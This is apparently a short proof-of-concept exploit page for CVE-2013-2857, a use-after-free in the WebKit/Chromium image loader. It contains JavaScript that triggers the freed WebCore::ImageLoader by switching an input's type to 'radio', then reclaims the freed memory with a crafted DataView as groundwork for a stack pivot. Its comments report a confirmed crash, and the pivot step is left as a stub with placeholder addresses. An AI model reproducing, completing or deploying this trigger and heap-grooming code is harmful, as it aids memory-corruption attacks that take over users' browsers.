<!--
Tested on 5.5.1
CVE-2013-2857
Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
Result: Bug is present, crash on what is presumably render
-->
<script>
var ar;
function UaF(a)
{
	var pivotAdressAdress = 0x0000513f;
	var baseLibWebkit = 0x88888888;
	var pivotAdress = baseLibWebkit + 0x0;
	var sizeWebCoreImageLoader = 0x20;
	var sprayCount = 0x10000000;
	
    ar =  new Array(1);
    
	//radio is the *ONLY* type that left the freed WebCore::ImageLoader free !
    a.type="radio";
	
	//Allocate this new WebCore::ImageLoader over freed WebCore::
    for(var i=0; i<1; i++){
        var t = new DataView(new ArrayBuffer(0xC0));

        t.setUint32(0x00, 0x41414141);
        t.setUint32(0x04, 0x42424242); //r5 r7 //Not good...
        t.setUint32(0x08, 0x00000000); //must be null....
        t.setUint32(0x0C, 0x44444444); //r6
        t.setUint32(0x10, 0x45454545); //
        t.setUint32(0x14, 0x46464646);
        t.setUint32(0x18, 0x47474747);
        
        ar[i] = t;
    }
	
	//Use the new WebCore::ImageLoader & pivot !
	return 0;
}
</script>

<input id="x" type="image" onerror="UaF(this);" src=""/>
